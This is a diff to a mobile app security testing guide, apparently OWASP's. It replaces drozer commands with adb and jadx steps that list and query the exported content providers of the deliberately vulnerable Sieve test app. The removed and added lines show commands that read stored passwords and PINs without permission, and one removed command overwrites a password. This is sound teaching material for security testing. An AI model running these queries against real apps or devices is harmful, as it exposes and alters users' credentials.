@@ -906,38 +906,42 @@ You can enumerate IPC components with [MobSF](0x08-Testing-Tools.md#mobsf "MobSF
 The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:
 
 ```bash
-dz> run app.provider.finduri com.mwr.example.sieve
-Scanning com.mwr.example.sieve...
-content://com.mwr.example.sieve.DBContentProvider/
-content://com.mwr.example.sieve.FileBackupProvider/
-content://com.mwr.example.sieve.DBContentProvider
-content://com.mwr.example.sieve.DBContentProvider/Passwords/
-content://com.mwr.example.sieve.DBContentProvider/Keys/
-content://com.mwr.example.sieve.FileBackupProvider
-content://com.mwr.example.sieve.DBContentProvider/Passwords
-content://com.mwr.example.sieve.DBContentProvider/Keys
+$ adb shell dumpsys package com.mwr.example.sieve | grep -Po "Provider{[\w\d\s\./]+}" | sort -u
+Provider{34a20d5 com.mwr.example.sieve/.FileBackupProvider}
+Provider{64f10ea com.mwr.example.sieve/.DBContentProvider}
 ```
 
-Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be good if sensitive keys and passwords could simply be queried from the provider!
+Once identified, you can use [jadx](0x08-Testing-Tools.md#jadx "jadx") to analyze the code of a content provider to identify potential vulnerabilities.
 
-```bash
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
-Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
+To identify the corresponding class of a content provider, use the following information:
+
+- `com.mwr.example.sieve` is the package.
+- `DBContentProvider` is the class to analyze in the package above.
+
+By analyzing the class `com.mwr.example.sieve.DBContentProvider`, the following URI were identified:
+
+```java
+package com.mwr.example.sieve;
+...
+public class DBContentProvider extends ContentProvider {
+    public static final Uri KEYS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");
+    public static final Uri PASSWORDS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
+...
+}
 ```
 
-```bash
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
-| Password          | pin  |
-| SuperPassword1234 | 1234 |
-```
-
-This content provider can be accessed without permission.
+Use the following commands to call a content provider:
 
 ```bash
-dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "newpassword"
-dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
-| Password    | pin  |
-| newpassword | 1234 |
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
+Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
+
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/
+Row: 0 _id=1, service=test, username=test, password=BLOB, email=t@tedt.com
+Row: 1 _id=2, service=bank, username=owasp, password=BLOB, email=user@tedt.com
+
+$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\"bank\"'
+Row: 0 email=user@tedt.com, username=owasp, password=BLOB
 ```
 
 #### Activities
